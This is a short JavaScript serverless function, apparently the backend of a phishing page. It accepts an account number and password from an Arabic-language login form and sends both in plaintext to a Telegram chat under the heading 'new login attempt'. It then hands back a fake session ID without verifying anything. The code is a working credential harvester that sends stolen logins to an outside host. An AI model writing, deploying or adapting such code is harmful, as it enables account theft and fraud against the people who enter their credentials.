const crypto = require("crypto");
const { nowAr, sendTelegram, jsonResponse } = require("./lib/telegram.cjs");

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return jsonResponse(405, { ok: false, message: "Method not allowed" });
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return jsonResponse(400, { ok: false, message: "طلب غير صالح" });
  }

  const id = String(body.id ?? "").trim();
  const password = String(body.password ?? "");

  if (!id || !password) {
    return jsonResponse(400, { ok: false, message: "أدخل رقم المميز وكلمة المرور" });
  }

  if (!/^\d+$/.test(id)) {
    return jsonResponse(400, { ok: false, message: "رقم المميز أرقام فقط" });
  }

  const text = [
    "🔐 محاولة دخول جديدة",
    "",
    `رقم المميز: ${id}`,
    `كلمة المرور: ${password}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    return jsonResponse(200, { ok: true, session: crypto.randomUUID() });
  } catch {
    return jsonResponse(502, { ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
};
